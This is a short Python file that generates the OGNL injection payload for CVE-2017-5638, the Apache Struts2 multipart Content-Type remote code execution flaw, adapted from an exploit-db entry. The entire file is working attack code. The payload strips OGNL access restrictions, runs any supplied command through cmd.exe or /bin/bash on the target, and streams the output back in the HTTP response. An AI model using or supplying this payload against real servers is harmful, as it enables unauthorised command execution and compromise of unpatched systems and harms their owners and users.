#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Based on:  https://www.exploit-db.com/raw/41570
Target URL example:  http://<RHOST>:<RPORT>/struts2-showcase/index.action
"""


def genPayload(cmd):
	"""CVE-2017-5638."""
	payload = "%{(#_='multipart/form-data')."
	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	payload += "(#_memberAccess?"
	payload += "(#_memberAccess=#dm):"
	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
	payload += "(#ognlUtil.getExcludedClasses().clear())."
	payload += "(#context.setMemberAccess(#dm))))."
	payload += f"(#cmd='{cmd}')."
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())}"

	return payload
